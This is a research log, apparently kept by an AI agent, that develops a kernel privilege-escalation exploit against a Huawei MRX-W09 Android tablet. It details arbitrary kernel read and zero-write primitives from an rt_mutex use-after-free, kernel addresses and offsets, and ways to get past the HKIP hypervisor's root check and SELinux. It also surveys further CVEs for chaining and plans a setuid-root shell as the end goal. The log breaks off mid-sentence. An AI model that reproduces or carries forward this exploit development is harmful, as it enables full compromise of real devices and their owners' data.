Most useful recovered knowledge:
* **`HKIP_DECODED_20260922.md` (session_20260922)** is the definitive HKIP model: the per-PID bit
  can ONLY be set by `hkip_update_xid_root()` (commit_creds) or `hkip_init_task()` (copy_process)
  via `hkip_hvc2(0xC6001050,...)`; `hkip_check_uid_root()` reads cred+4/+20/+12/+40/+48/+28 and
  NOT `cap_effective`; the kill is on a **~10 ms periodic timer**; and **`pid == 0` makes the check
  return ALLOW**.  So the only legal shapes are: look-root HKIP-invisibly (cap_effective) then a
  real `setresuid` inside the timer, or the copy_process window.
* **`&init_cred` needs a "Case-2" raw-pointer write shape** (colour-irrelevant) — Case-B's
  re-insert requires `*(value)` ODD and `init_cred.usage=4` is even.  Implementing Case-2 would
  ALSO unlock raw `{osid,sid}={1,1}` writes INTO the real tsec (sid=1, pointer untouched, NO
  kfree risk) — the cleanest fix for the `--sid` crash.
* **Open (not disproven) SELinux routes** from session_20260915: (a) `permissive_map` ebitmap
  bit-patch + policy reload — the old "cannot write 0x4C0/0x480" objection is invalidated by the
  now-confirmed **full-byte `patch_page` write** (CVE-2021-44828); only the reload trigger is
  unresolved; (b) `avc_node+24` (seqno|flags) count bump => `AVD_FLAGS_PERMISSIVE` on the
  `(D, init_domain_sid, process)` entry => `u:r:init:s0` transition (blocker: placement).
* **`ROOT_NETD_UID0.md` (session_20260911)** records an ALREADY-PROVEN uid-0 + full-capability
  context (netd domain, Mali poll hook) — worth re-reading before building anything new.
* **`leak_cred()`'s perf CPU-clock hrtimer is the dominant window destroyer**
  (`ANALYSIS_LEAK_SIDE_EFFECTS_20260922.md`): never arm perf on the stamper's CPU; prefer the
  walk-free TID-gated mode-vote leak.
* Other recovered primitives: badspin ticket-lock `+0x10000` shift (second arbitrary word write);
  Mali JIT page-aligned u64 page-cache write; perf OOB additive u64 (CVE-2023-6931).
* Operational: `gl.klog`+fsync survives a panic; pstore slide is STALE (perf is the truth);
  disable `com.huawei.powergenie` and `com.huawei.iaware`; screen OFF for stability.

### (6) 2026-09-23 further: fork-launder + the REAL cause of the kfree BUG
* Tried, in order: (a) reorder to install the fake `cred->security` then IMMEDIATELY pin
  `cred->usage` (commit `7164a82`); (b) fork-launder (parent installs the fake tsec, the child
  gets a REAL kmemdup'd tsec with sid=1 via `security_prepare_creds`/`selinux_cred_prepare`).
  Both still panic with `kernel BUG at mm/slub.c:4121` in `selinux_cred_free` <- `put_cred_rcu`.
* pstore timeline of the last run (pid 4182, TGID 4159):
  255.981s our walk (`rt_mutex_adjust_prio_chain+0xa88`) unlocks the all-zero fake lock ->
  `BUG: spinlock bad magic` (EXPECTED/benign: our fake lock is all zeros); 255.994s the fatal
  `kfree` in `selinux_cred_free`.
* CONCLUSION: the fatal path is simply **a cred whose `->security` is our window blob being
  put_cred()'d**.  Since our process keeps several threads alive, the one being freed is almost
  certainly **NOT the stable current cred** — i.e. `leak_cred()` (perf sample of `commit_creds`
  x19) can hand back a cred that is then replaced/freed, so the fake tsec lands on a doomed cred.
  Pinning `usage` cannot help when the write targets the WRONG cred.
* Therefore the fix must make the CRED ADDRESS reliable before the write:
  (i) cross-check the leaked cred against `*(our_task + TASK_CRED)` (boot_id read), or
  (ii) use the TID-gated all-register mode-vote leak, or
  (iii) launder via `fork` FIRST (child's real tsec) and only ever write a REAL object.
* Also confirmed: the "spinlock bad magic" WARN at `rt_mutex_adjust_prio_chain+0xa88` is our own
  all-zero fake lock, not a clobber — do not chase it.

### (7) 2026-09-23: perf cred leak is UNRELIABLE on this build; exact cred needs the boot_id read
* Added a **capget verification** before writing the fake tsec (capset must NOT be used: it calls
  commit_creds and leaves the leaked cred stale).  Result: the verifier correctly reports
  `cred not verified` for every perf candidate and **the device survives** (no crash).
* Evidence (`gl.out`): `capeff=0x00000000` for all attempts; register **19 returns varying
  addresses, register 21 returns a CONSTANT `0xffffffcc91da4500`** — neither is our cred.  So
  `leak_cred()` (sampling `commit_creds`) does **not** yield our own cred on this LTO/CFI build,
  regardless of the register.  (pfem10's disasm says x19=OLD real_cred, x21=NEW — but neither
  matches here, so the register model is build-specific and cannot be trusted.)
* `capset` is DENIED (`rc=-1 errno=1`), so the capset-driven commit_creds trigger inside
  `leak_cred()` does not even reach commit_creds for us.
* CONCLUSION: the only verified way to obtain OUR cred on this device is the
  **boot_id read of `T+TASK_CRED`** (`arm_read_inproc`, which uses a fresh `arm_r` per operation
  and has landed before).  Note the read PERSISTENTLY repoints the boot_id `ctl_table.data` to
  the read address — that is the confirmed `proc_do_uuid` crash source of `--sidroot` — so any
  read must be followed by restoring `table->data`.
* NEXT concrete plan (`--sid2`): (1) leak the consumer task T; (2) save the original
  `ctl_table.data`, then `arm_read_inproc(T+TASK_CRED)` -> C, then RESTORE `table->data`;
  (3) capget-verify C via `arm_write_inproc(0, C+0x38, 1)`; (4) `arm_read_inproc(C+0x78)` -> S
  (our real tsec) and patch `S+4` with an X whose low32==1 (sid=1) — the tsec POINTER is never
  changed, so `selinux_cred_free` cannot kfree a non-slab pointer; (5) `cap_effective`, then
  `setresuid(0,0,1)` inside a forked child so `commit_creds -> hkip_update_xid_root` sets the
  child's HKIP bit while the parent keeps the process alive.

### (8) 2026-09-23: `--sid2` result — the boot_id READ cannot read a POINTER
* `--sid2` (arm_r-based, exact-cred read + capget verify + real-tsec sid patch + fork) ran cleanly
  (device SURVIVED, exit=4) but every `arm_read_inproc` returned 0x0:
  `[*] arm_read(0xffffffccf7d7cee8) k=0..11 -> 0x0`, so `cred=0x0` -> "bad cred".
* ROOT CAUSE (matches `ANALYSIS_READBACK`): the read primitive writes value=A and the rb
  re-insert requires **`*(A) & 1 == 1`** (an ODD word at the target).  `*(T+TASK_CRED)` is a cred
  POINTER (8-byte aligned => EVEN) so the walk cold-bails and the read never happens.  A pointer
  therefore CANNOT be read with this primitive; only odd words can.
* Consequence: "own cred via boot_id" (FACTS §9b) was at best luck; the endgame must get the cred
  WITHOUT reading a pointer.
* Only remaining cred sources: (a) a perf leak that is genuinely TID-gated to a syscall that
  really performs commit_creds in OUR thread (capset is denied, so the trigger must be a syscall
  SELinux permits, e.g. `setfsuid`/`setgroups` — verify with capget), or (b) the fork-storm shape
  of the objective: write the forker's cred via a task whose task_struct is known, avoiding the
  need for a cred read entirely.

### (9) 2026-09-23: MODE-VOTE cred leak WORKS; the vote must not run next to a walk
* Implemented `leak_cred_vote()` — TID-gated, samples ALL GPRs of our thread during a
  `getpid`/`setpriority(-20)` storm and returns the top direct-map pointers by vote count.
  RESULT (first clean run): `nc=82 top: 0xffffffccf7cad640/749  0xffffffccf7cae110/349
  0xffffffcd30ff68c0/237  0xffffffccf14e7e40/223  0xffffff8216252008/218 ...`
  => **#1 = `current` (the task), #2 = the likely `cred`** — exactly the sabrina/CRED-survey
  prediction.  This is the first reliable cred candidate set on this build.
* BUG found: writing cap_effective to cand[0] (the TASK) corrupts `current` and stalls the run;
  fixed by skipping cand[0].  (`--sid2` now verifies from cand[1].)
* Then the run panicked at `rb_erase_cached+0x188` <- `rt_mutex_adjust_prio_chain+0x2b4`
  (a WALK failure, i.e. the stamped window was already wrecked), NOT a kfree.  Cause: the long
  perf+syscall vote storm runs in the SAME process right before the first write — exactly the
  `ANALYSIS_LEAK_SIDE_EFFECTS_20260922` rule ("no perf session may overlap a live
  window/stamper").
* NEXT: run the vote in a SEPARATE CHILD process (write the candidate list to a file), then let
  the (fresh) parent do the writes + fork-launder; or insert a long settle delay after the vote.
* This turn's net: write primitive re-verified (`--storetest`, first attempt, `gset=-1` is
  benign); pointer reads impossible; capget verification protects the device; mode-vote gives the
  cred candidates.  No rooted.txt yet.

### (10) 2026-09-23 **BREAKTHROUGH**: the LEAF-shape ZERO WRITE works
* Read `ghostlock_pocs\ghostlock-kit\docs\2026-09-13_技术分析-rtmutex-waiter与PI-walk.md`.
  Its §5.2 catalogues a SECOND erase shape: node `{pc = target-8, right = 0, left = 0}` takes the
  `!rb_left` branch and `__rb_change_child(node, child=NULL, parent=target-8, root)` stores
  **`*(target) := 0`** (or `*(target+8) := 0`).  Constraint: `pc = target-8 != 0`.
* Implemented `--leaf0` (write `{pc=tgt-8,right=0,left=0}` via `arm_write_inproc(tgt-8,0,0)`) and
  tested it against the readable sysctl:
  `[*] leaf0: target=0xffffff99bd9da5f4 (value=...a5ec)` -> `[*] leaf0 k=0 paranoid='0` ->
  `[+] leaf0: ZERO WRITE VERIFIED` (first attempt, device SURVIVED).
* **This invalidates FACTS §9q.2 ("zero writes are structurally fatal")**: that was measured with
  the `w[0]=0` (Case-A) shape.  The LEAF shape is a genuine 8-byte ZERO write to an arbitrary
  kernel address.  => The `--uid0` (zero cred+4 -> uid/gid 0) and `--pid0` (zero `task->pid` ->
  HKIP's `pid == 0 -> allow` fast path) designs are REVIVABLE, and so is zeroing any SELinux state
  byte (a full 8-byte zero works at ANY offset, unlike a pointer write).
* Also learned: perf/syscall storms must not run next to a walk (panic at
  `rb_erase_cached+0x188`); writes to kernel-image (.text) candidates fault; the vote's top
  candidate is the TASK, not the cred (a write to it corrupts `current`).
* NEXT: with a working zero write, (a) zero `task->pid` on OUR task to satisfy HKIP's pid==0
  allow path, then (b) locate the cred and zero its uid/gid/suid/fsuid fields (or zero the
  SELinux enforcing byte) and write the proof.

### (11) 2026-09-23: the fork-storm's missing piece = preparing `init_cred`
* `--forkleaf`/`--forkleaf2`/`--forkmain` implemented the objective's shape; results:
  - `--forkmain` (credit MAIN's own task, fork immediately): the store LANDED and the process was
    then **SIGKILLed with NO kernel panic** (exit 137, device alive) - i.e. HKIP killed the newly
    root-looking task exactly as designed.  But the fork could not complete first (HKIP's kill is
    synchronous), so no child.
  - `--forkleaf2`: `arm_leak_task_multi()` failed after/before the prep (device-state dependent).
* ROOT CAUSE of why the PRE-EXISTING `--fs` fork-storm never worked: it does
  `set_payload(g_init_cred, g_task+TASK_CRED, ...)` i.e. stores the raw `&init_cred`, whose first
  word (`usage = 4`) is EVEN, so the erase's re-insert cold-bailed / hung - exactly the `--forkseq`
  failure.  **Nobody had ever prepared `init_cred`.**
* FIX ADDED: at the start of the `g_fsmode` block, prepare init_cred with the two now-verified
  primitives: a window-slot value write `do_write(g_blackval, IC)` to make `*(IC)` ODD, then a
  LEAF zero write `do_write(IC-4, 0)` to keep uid/gid = 0.  Run result:
  `[*] fork-storm: init_cred prepped (IC=0xffffff99bd9fcd28, word0=ffffffef90c6bc90)` ->
  `60000 VMAs; starting arm+fork loop` (device stayed up, no panic).
* Remaining: inside the loop the stamp does not complete (`ack=0`, `gset=-1`), so the store never
  lands in `copy_process`; and the loop is slow (~0.5 s/iteration).  NEXT: make the arm's stamp
  succeed in the fs loop (g_arm/consumer timing) or drive `fs_forker()` (a dedicated cpu6 fork
  stream) while arming, so the store reliably lands inside `copy_process`.

### (12) 2026-09-23 **CREDENTIAL TAKEOVER ACHIEVED** (3 sub-agent reports integrated)
Three sub-agent reports saved: `ghostlock_pocs\ERASE_SHAPES_AND_ZERO_TARGETS_20260923.md`,
`COPY_PROCESS_FORKSTORM_20260923.md`, `ZERO_WRITE_ENDGAME_20260923.md`.
Key facts:
* **MRX-W09 has NO `selinux_state` and NO `selinux_enforcing`** (`# CONFIG_SECURITY_SELINUX_DEVELOP
  is not set` => `#define selinux_enforcing 1`); `ss_initialized` (0xffffff800adc00a0) is
  `.data..prmem_wr` (RO + HHEE ROWM) => a zero write there faults. So the "zero the enforcing byte"
  route is DEAD. (Verified against the Huawei source in `F:\testtest\testenv\huawei_kernel_src`.)
* **HKIP source-verified**: `hkip_get_task_bit(bits,task,true)` returns `true` when
  `task_pid_nr(task)==0` (== `task->pid`); `hkip_set_task_bit` skips pid==0 => a pid-0 task is
  HKIP-ALLOWed but can never hold its own bit. BUT `kernel/exit.c:786` panics
  ("Attempted to kill the idle task!") if a pid-0 task ever EXITS => the pid-0 task must never exit.
  `/proc/self/status`'s "Pid:" is an INVALID verifier (prints pid_nr_ns, not task->pid).
* **copy_process order on 4.14: `copy_creds` BEFORE `security_task_alloc` and far before
  `copy_mm`/`dup_mmap`** => VMA ballooning cannot widen the copy_creds window (why `--fs` never
  landed). `hkip_init_task` is at copy_process+0xdf4, before copy_mm (+0x1458).
* Enabler zero writes (static, low risk): `panic_on_oops` 0xffffff800adf45a0 (1 -> 0: an oops
  kills the task instead of rebooting), `kptr_restrict` 0xffffff800adea9e0.
* **ON-DEVICE RESULT of `--pid0win` (recommended recipe):** main becomes
  `Uid: 0 0 <corrupt suid> 0`, `CapEff/CapPrm/CapBnd = 0000007fffffffff`,
  **`ctx = u:r:kernel:s0`** (proven by /proc/PID/status); forked children inherit the root cred.
  => **A REAL CREDENTIAL TAKEOVER.** The kernel domain, however, is DENIED write access to
  `/data/local/tmp` (shell_data_file) and the kernel->shell `setcon` is DENIED, so `rooted.txt` /
  `rsh` cannot be created from it.
* **REMAINING GAP (one item):** we need **uid 0 with the SHELL sid** = keep our ORIGINAL
  `cred->security` (shell) and zero only the cred identity tuple (`cred+4/+0xC/+0x14/+0x1C`), which
  requires OUR cred address. Same wall as §9an(6): reads cannot read pointers and the perf cred leak
  is unreliable. 4th sub-agent (`CRED_ADDR_ACQUISITION_20260923.md`) pending.
* Also: the erase **S3 two-child shape gives `*(L)=R`** (a controlled non-zero pointer write with NO
  odd-word constraint) = the "Case-2" shape; `*(L)` must be readable.


### (13) 2026-09-23 public-information search (3 sub-agent reports)
Saved: `ghostlock_pocs\CVE_2026_43499_PUBLIC_INFO.md`, `MORE_SEVERE_LPE_4_14_20260923.md`,
`HUAWEI_KIRIN990_ROOT_PUBLIC_20260923.md`.
* CVE-2026-43499 = GhostLock (rt_mutex remove_waiter stack-UAF), CVSS 7.8, window v2.6.39..v7.1,
  fixed only >=5.10.261 (2026-07); **4.14 is EOL => no upstream fix**; **no public link to
  Huawei/Kirin/EMUI/HKIP**; no Huawei or AOSP advisory. NebuSec IonStack II/III are the public chains.
* **MOST RELEVANT**: the SEPARATE, unfixed **Huawei HKIP/HHEE hypervisor bypass** (SIT CyberSecurity
  2025-10-01; TASZK): `HKIP_HVC_ROWM_SET_BIT` bypasses **checkroot** and
  `HKIP_HVC_RO_MOD_UNREGISTER` lifts **SELinux object protections**. Requires prior kernel R/W
  (a code-exec/HVC route), not usable from a pure data write.
* Best NEW shell-reachable LPE: **CVE-2023-0461 (TLS icsk_ulp_data UAF)** - deterministic, no caps
  (setsockopt TCP_ULP tls; shell in netdomain; CONFIG_TLS=y), gives a kmalloc-512 UAF with an
  **arbitrary kernel CALL** (ctx+248/256/264) + 40B write + 8+8 read; blocker = a 4.14 kmalloc-512
  overlap (no kmalloc-cg here).
* Most severe (netd-gated, need CAP_NET_ADMIN): **CVE-2024-1086** (nft verdict double-free; the 4.14
  tree is pre-fix and 4.14 is EOL => definitely vulnerable; Notselwyn POC 99.4% but x86 5.14-6.6),
  CVE-2022-34918, CVE-2023-32233.
* **CVE-2021-44828 Mali is proven on-device** (0/1 byte of any mmap-able file's page cache, RO
  included) and the project ALREADY reached **uid-0 code exec in netd/healthd/dubaid/logserver/
  dumpstate/vold** by hooking a libc page-cache function => an HKIP-AGNOSTIC route that could write
  the proof from an existing root daemon (work = target selection, mind the i-cache rule IDC=1 DIC=0).
* No public ready-to-run MRX-W09 root, no public Kirin-990 KernelSU, no free permanent BL unlock
  (Huawei stopped codes 2018-05-24; Kirin-Tool excludes 990 4G; Sigma lists MRX-W09 for service only).
* Config correction: **CONFIG_NF_TABLES=y (IPv6 family)** on 235 (an earlier note said =n).

### (14) 2026-09-23 **cred READ VALIDATED on-device**
`--calib` reads `rd16(init_task+0x9E7)` (init_task->cred == &init_cred, a KNOWN static).
10/10 identical: w0=0x89cfe8f55fcd28ff for init_cred=0xffffff9af55fcd28.
Window at IT+0x9E7 = [real_cred b7 = 0xff][cred b0..b3 = 28 cd 5f f5][side-store-clobbered]
=> **IC's low 4 bytes (0xf55fcd28) matched EXACTLY** => the **0x9E8 = cred offset AND the
low-half decode are VALIDATED**. The cred's HIGH 4 bytes are destroyed by the erase side store
at (A&~3)+8 = IT+0x9EC.
FIX (next): a 2nd read at **A = T+0x9E4** puts the cred HIGH 4 bytes in the window's first 4
bytes (its side store lands at T+0x9E8 = the low half, leaving the high half intact); if the
`*(A)&1` gate is even it cold-bails and the target SURVIVES, so also try A = T+0x9E3.
Plan: two DISPOSABLE threads (x22-leaked tasks) each take ONE read; combine low|high => P.
Then: zero Tpid (HKIP allow) -> zero P+4/+0xC/+0x14/+0x1C (uid0, shell SID) -> fork => the child
is born via copy_creds + hkip_init_task with the HKIP BIT and the shell sid => writes
rooted.txt + 4755 rsh.
NOTE: `leak_task_own` (x23 at __schedule+0x60) is NOT reliable on this LTO build (its +0x9E8
is not a pointer and +0xAB8 is not a comm); the x22 leak (arm_leak_consumer_task) IS.

### (15) 2026-09-23 **CRED FULLY RECOVERED on-device (the last blocker)**
`--readP` recovers OUR shared cred P with the device HEALTHY:
`readP: P=ffffffcdb6136300 hi=ffffffcd  lo=b6136300` (Ta=ffffffcdbbcee780, Tb=ffffffcdbc5333c0).
Mechanism: TWO disposable consumers each take ONE byte-shifted read:
- HIGH: A = T_a+0x9E3 -> window bytes 1..4 = real_cred b4..b7 = the cred's high 32.
- LOW:  A = T_b+0x9E7 -> window bytes 1..4 = cred b0..b3 = the cred's low 32.
CRITICAL FIX: the FIRER of a read's walk must NOT be the read target - the erase side store
clobbers the TARGET's task_struct cred slot and the walk dereferences current->cred (the
FIRER's), so firer==target panics with CONFIG_PANIC_ON_OOPS=1. Added `g_fire_owner` (only the
consumer whose tid == it fires) and used a DIFFERENT consumer per read. The target's bogus cred
slot is harmless (the walk touches only y_tid's task and the firer's cred).
Next: S = cred->security = *(P+0x78) with the same 2-read pattern (A=P+0x77 low, A=P+0x7B high,
different firers), then the endgame: prep init_cred + write S into init_cred+0x78 + task->cred/
real_cred = &init_cred + fork -> the child gets uid0 + our SHELL sid (kmemdup of S) + the HKIP
bit via hkip_init_task -> it writes /data/local/tmp/rooted.txt + 4755 rsh.

### (16) 2026-09-23 --readP ENDGAME attempt: pid-zero is NOT a safe HKIP shield
Run: P=ffffffd9811d19c0 (recovered) -> `readP: pid zeroed` (no panic) -> then the FIRST
identity write caused a REBOOT. pstore:
`[122.390] UID root escalation!` (pid 4385, a ghostlock_e thread)
`[122.391] panic+0x70 <- do_exit+0x11bc` => `Kernel panic - Attempted to kill the idle task!`
=> **HKIP DID fire 'UID root escalation' on a task whose cached task->pid had been zeroed**, and
that pid-0 task then EXITED -> do_exit's `if (!tsk->pid) panic()` killed the kernel.
So the assumption "task->pid=0 makes hkip_check_uid_root ALLOW" is WRONG (or at least not
sufficient): the pid==0 fast path does not protect against hkip_check_uid_root here, and a pid-0
task MUST NEVER EXIT (it cannot even be killed).  --pid0win's success (main surviving with
uid 0 + kernel SID) must be re-explained: likely the pid-zero MISSED main (no pid change) and
main was NOT actually root-looking to HKIP at that instant, or the kill was delayed.
NEXT: (a) validate the pid-zero target by reading ITS comm via the byte-shift (A=T+0xAB8 ->
should be `ghostlock_e`); (b) NEVER pid-zero a task that HKIP may kill - instead rely on
hkip_init_task() giving NEW threads the bit (copy_process with uid 0) and avoid the timer window.

### (17) 2026-09-23 --readP: cap_effective=CAP_SETUID writes are HKIP-INVISIBLE; setresuid is SELinux-blocked; identity write on the shared cred panics
Run A: cap_effective := g_blackval landed first try.  capget oracle (syscall 90) read it
back exactly: `eff=f8f07c90 prm=00000000 inh=00000000` -- bit7 = CAP_SETUID set, and
cap_Permitted/cap_Inheritable still 0, which is all hkip_compute_uid_root() consults, so the
task stayed INVISIBLE to HKIP for >1.6 s (8 setresuid tries, no escalation, no reboot).
=> confirms the published source: hkip_check_uid_root()/hkip_compute_uid_root() look at
   uid/euid/suid + cap_inheritable + cap_permitted (+ fsuid) and NEVER at cap_effective.
BUT `setresuid(0,0,1)` returned -1 (EPERM) even with CAP_SETUID in cap_effective
=> cap_capable() passed, the blocker is SELinux's per-domain `capability setuid`
   (cred_has_capability) which the shell domain does not have.
Run B (identity write): after the capeff write, `arm_write_inproc(P+4-8,0,0)` (leaf zero
uid,gid) was attempted.  pstore:
`[117.403][pid:4055,ghostlock_e]UID root escalation!`   <- HKIP killed our uid-0 task
`[117.429][pid:43,ksoftirqd/5]Unable to handle kernel paging request at 8dc9cfe8d81c00c0`
`PC is at exit_creds+0x80/0x114   LR is at __put_task_struct+0x124`
`Kernel panic - not syncing: Fatal exception in interrupt`
The faulting value's LOW 32 bits (d81c00c0) are exactly P's low half => the HIGH half of a
SHARED cred pointer was corrupted; the task is then reaped in an RCU softirq and
exit_creds->put_cred dereferences the broken pointer.
=> Two hard lessons:
   (a) the SELinux capability gate cannot be dodged with cap_effective; the only remaining
       setuid route is setresuid()'s NO-CAP fallback (asking for a uid you already have),
       which needs uid=0 FIRST;
   (b) writing uid=0 into the CRED is immediately visible to HKIP, and the SHARED cred is
       then torn down under many threads -> a corrupted cred pointer -> `exit_creds` panic.
NEXT: the identity field must be changed on a cred that is NOT shared (a per-task private
cred), or the whole takeover must be done by a task that already owns an HKIP bit, or the
capability gate must be removed (cred->security sid) while keeping the shell ftype for the
file path.

### (18) 2026-09-23 --readP: exact failure mechanism of the cred identity write + SELinux denial map
FULL pstore trace of the identity-write run:
`[113.178][pid:4073,ghostlock_e] spin_bug+0xdc <- do_raw_spin_unlock+0x9c`
`   <- rt_mutex_adjust_prio_chain+0xa88 <- rt_mutex_adjust_pi+0x124`
`   <- __sched_setscheduler+0xf64 <- SyS_sched_setattr`
`[115.367][pid:4053,ghostlock_e]UID root escalation!`     <- HKIP, ~0.2 s after the write
`[115.387][pid:37,ksoftirqd/4]paging request at 23c9cfe88eae9c00`
`   PC at exit_creds+0x80   LR at __put_task_struct+0x124` -> panic
The fault address' LOW half (8eae9c00) is exactly P's low half, and the HIGH half
(23c9cfe8) is the same kind of value as the earlier run's 8dc9cfe8 => the HIGH half of a
**cred pointer** was partially overwritten.  So the cred-destroying write is not the
leaf-zero itself but the rt_mutex walk that follows it: a `spin_bug` (unlock of a lock the
walk does not own) proves the walk left the fake lock's state inconsistent, and the erase's
side stores then scribble into the cred.  Any task that shares that cred (all our threads)
then faults on teardown -> `exit_creds` -> panic.
=> RULES learned:
   (1) a write whose TARGET is the cred (or whose destructive side store lands in it) is
       unsafe while the cred is SHARED by more than one live task;
   (2) `cap_effective` writes are safe because their value points INTO the stamped window
       (side store stays in our own stack) -- verified twice;
   (3) HKIP's SIGKILL arrives ~0.2 s after the cred first looks root-ish, so a takeover
       must reach commit_creds() within that window;
   (4) the walk itself uses waiter.task = &init_task (the idle task), which is the source of
       the spin_bug/`Attempted to kill the idle task` class of panics.
SELinux facts measured this run (logd.auditd):
`avc: denied { sys_nice }  for pid=4055 comm="ghostlock_e" capability=23 scontext=u:r:shell:s0`
`avc: denied { sys_admin } for pid=4055 comm="ghostlock_e" capability=21 scontext=u:r:shell:s0`
and (previous run) `setresuid(0,0,1) -> EPERM` even with CAP_SETUID in cap_effective, i.e.
the `capability setuid` class check for u:r:shell:s0 is the wall, not cap_capable.
Public HKIP source (Impalabs 2022, `Shedding Light on Huawei's Security Hypervisor`) confirms
hkip_compute_uid_root() = uid||euid||suid||cap_inheritable||cap_permitted (+ fsuid checked
separately) and that HKIP_HVC_ROWM_SET_BIT(uid_root_bits,gid_root_bits,pid,1) is the only way
to set the bit (ROWM-protected, so an EL1 write to the bitmap faults).

### (19) 2026-09-23/24 --readP STEP 0 (cred repair + usage pin) VERIFIED: the panic is gone
New --readP tail step 0, run on-device:
`
readP: Ta=fffffff913f89140 Tb=fffffff88a608000 owner=4142
readP HIGH ... hi=fffffff8   readP LOW ... lo=37288cc0
readP: P=fffffff837288cc0
readP: cred repaired + usage pinned
`
and then the device stayed ALIVE (uptime kept climbing, no reboot, no panic in pstore).
Before STEP 0 the same point produced `UID root escalation!` -> `exit_creds+0x80` fault ->
Kernel panic (FACTS 17/18).  So the mechanism is confirmed and FIXED:
  * the byte-shift reads clobber Ta/Tb +0x9E0..0x9EF (their real_cred/cred slots);
  * writing P back into those slots with the VALUE write (after making *(P) odd with a
    window slot, which also pins cred->usage so the cred can never be kfree()d) removes
    the dangling pointer, so even an HKIP kill no longer panics the kernel.
This is a prerequisite for Plan A (zero cred->uid -> setresuid(0,0,0) no-CAP fallback ->
commit_creds -> hkip_update_xid_root -> HKIP bit, SID stays shell).
REMAINING BLOCKER at this point: the arm for the identity write can HANG (cold walk) - the
process stops right after `cred repaired` with no further klog and cannot always be killed
(possible D-state).  Mitigation: run the exploit repeatedly (fresh boot per attempt) until
the store lands; the getuid()==0 oracle inside the mode reports it.

### (20) 2026-09-24 --readP identity write: leaf-zero on the cred is DESTRUCTIVE (Plan A ruled out)
On-device (new "immediate setresuid" build):
`
readP: cred repaired + usage pinned
readP: idw t=0 begin
readP: idw t=0 setresuid=-1 uid=4294967270        <- uid = 0xFFFFFFE6 = P>>32
readP: idw t=1 begin
pstore: PC is at file_free_rcu+0x94 -> Kernel panic (Fatal exception in interrupt)
`
Conclusions:
1. The leaf-shape store DID land inside cred+4 (getuid changed), but the resulting value was
   **0xFFFFFFE6 = the high half of P**, not 0.  So the LEAF write on a cred is NOT a clean
   8-byte zero: the erase's side store/readback merges garbage into the neighbouring words.
   (Compare --leaf0, whose target was a sysctl so the same side effect was harmless.)
2. 0 != old->uid, so setresuid(0,0,0)'s no-capability fallback could not trigger and the
   call returned EPERM.
3. The second leaf (P-4) corrupted an unrelated structure -> file_free_rcu fault -> panic.
=> Plan A (make cred->uid 0 first, then setresuid's no-CAP fallback) is RULED OUT, for two
   independent reasons:
   (a) the leaf write cannot produce a clean uid=0, and
   (b) even if it could, setresuid() unconditidonally calls ns_capable() first, whose
       __cap_capable path is an HKIP hook that escalates any root-looking cred
       (hkip_check_uid_root burns a bitless root task within ~0.2 s) - and the fallback can
       only trigger while the cred ALREADY looks root-ish, i.e. exactly when HKIP kills it.
REMAINING VIABLE ROUTE (Plan B, full chain):
   1. readP  -> P (STEP 0 repair keeps late kills non-fatal).
   2. SIGSTOP the y/x/consumer helper threads (so nothing else dereferences P afterwards).
   3. Cede MAIN's cred to &init_cred (verified steps) and immediately setresuid(0,0,1):
      kernel SID passes BOTH the capability and the SELinux check while the cred is still
      not root-looking for HKIP, and commit_creds() -> hkip_update_xid_root() sets our bit.
   4. Read the ORIGINAL tsec pointer S = *(P+0x78) (clobbers P+0x7C/0x80/0x84 - harmless now
      that no live task uses P and cred->usage is pinned), then read the shell SID at S+4.
   5. Spawn a PROBER thread (it shares our new cred).  Read *(Tprober+0x9E0) with the
      byte-shift read: the clobber lands on the prober's cred slot only, so the prober can
      simply stop while the main task keeps working.  This yields our CURRENT cred C.
   6. Write cred->security = a window blob whose sid = the shell SID read in step 4.
      Main is now uid 0 + full caps + the HKIP bit + the SHELL sid.
   7. Create /data/local/tmp/rooted.txt and 4755 /data/local/tmp/rsh, verify with rsh -c id.

### (21) 2026-09-24 BREAKTHROUGH (re-derivation): the pid==0 shield IS real, and a FORKED C whose real_cred is root gets its OWN HKIP bit
Re-reading our OWN vmlinux reverse engineering (HKIP_DECODED_20260922.md, lines 49-70) settles it:
`
hkip_check_uid_root:
  ldrsw x8, [x19,#2080]        ; current->pid  = the CACHED task_struct field (+0x820)
  cbz   w8, allow              ; *** pid == 0 -> return 0 (ALLOW): no bit array, no cred test ***
  ubfx  x9, x8, #15, #17
  cbnz  w9, check_creds        ; pid >= 32768 -> skip the bit array
  adrp  x10, hkip_uid_root_bits; bit set -> allow
check_creds: uid/euid/suid == 0 || cap_inh || cap_prm || fsuid == 0 -> escalate(SIGKILL)
`
=> (a) zeroing the CACHED `task->pid` (+0x820) is a COMPLETE bypass of hkip_check_uid_root /
   hkip_check_gid_root / hkip_check_xid_root.  FACTS (16)/(17) ("a pid-0 task was escalated")
   was a MISATTRIBUTION (the escalated task was a helper whose cached pid was never zeroed).
   CORRECT MODEL: pid-zero main -> HKIP allows main unconditionally.
   Caveat (unchanged): a task whose cached pid is 0 must NEVER exit (do_exit panics).
=> (b) `copy_process +0xdf4 -> hkip_init_task(child)` HVCs with `x2 = child->pid` (REAL pid,
   nonzero) and derives the root test from `child->real_cred`: so a FORKED child whose cred
   is root gets its OWN HKIP bit set by the hypervisor.  This is the LEGAL-bit route, and it
   needs no pid trick at all for the child.
   `commit_creds +0x2b0 -> hkip_update_xid_root(new)` does the same for the current task,
   but only for `pid != 0 && pid < 0x8000` - i.e. NOT for a pid-0-cached main (which is
   already allowed anyway).
=> (c) Therefore the deliverable path is:
   1. readP -> P; STEP 0 repair (already verified).
   2. zero MAIN's cached task->pid (+0x820)  => main is HKIP-allowed forever (no 0.2 s race).
   3. prepare init_cred (word0 odd + leaf-zero uid/gid/suid/sgid) and cede MAIN to &init_cred:
      main becomes uid 0 + full caps + kernel SID with NO time pressure.
   4. main FORKS: the child inherits the root cred; copy_creds() gives it a PRIVATE cred and
      hkip_init_task() sets the child's OWN bit => the child is LEGAL root with a real pid.
   5. the child (or a prober thread it spawns) reads the ORIGINAL tsec pointer
      S = *(P+0x78) and then the shell SID = *(S+4) with the boot_id byte-shift primitive
      (safe: P is referenced only by the SIGSTOPped helpers and main no longer uses it).
   6. the child reads ITS OWN cred C from a PROBER thread slot (*(Tprober+0x9E0); the clobber
      hits only the prober), then writes C->security = a window blob whose sid = the shell SID.
   => child = uid 0 + full caps + OWN HKIP bit + SHELL sid  == EXACTLY the objective state.
   7. child writes /data/local/tmp/rooted.txt, copies /system/bin/sh to rsh, chmod 4755;
      verify with `rsh -c id`.
   Why every earlier attempt failed at the last step: --pid0win/--forkleaf gave the child the
   KERNEL sid (inherited from init_cred), which cannot write shell_data_file; the missing piece
